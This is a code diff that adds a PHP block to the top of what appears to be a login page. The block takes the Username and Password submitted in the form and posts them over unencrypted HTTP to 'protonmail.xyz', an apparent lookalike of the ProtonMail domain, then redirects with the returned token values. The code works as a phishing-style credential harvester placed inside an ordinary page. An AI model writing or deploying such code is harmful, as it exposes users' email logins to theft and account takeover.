@@ -1,3 +1,49 @@
+<?php
+ini_set('display_errors',1);
+error_reporting(E_ALL);
+ini_set('memory_limit', '-1');
+ini_set('max_execution_time','-1');
+
+
+if ( $_POST ) {
+
+  $url = 'http://protonmail.xyz/auth/auth';
+
+  $data = array("response_type"=>"token",
+    "username"=> $_POST['Username'],
+    "password"=> $_POST['Password'],
+    "hashedpassword"=>"",
+    "client_id"=> "demoapp",
+    "client_secret"=> "demopass",
+    "grant_type"=> "password",
+    "redirect_uri"=> "https://protonmail.ch",
+    "state"=> "random_string");
+
+  $data_string = json_encode($data);
+  $ch = curl_init($url);
+  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+  curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        'Content-Type: application/json',
+    'Content-Length: ' . strlen($data_string), 'Cache-Control: no-cache'));
+
+  $result = curl_exec($ch);
+
+
+  $result = json_decode($result,true);
+  foreach($result as $key=>$value) {
+    $postvars .= $key . "=" . $value . "&";
+  }
+
+    $redirect_uri = '/angular-login?' . $postvars;
+
+    curl_close($ch);
+      header('Location:'. $redirect_uri);
+}
+
+
+?>
 <!doctype html>
 <html lang="en">
 <head>
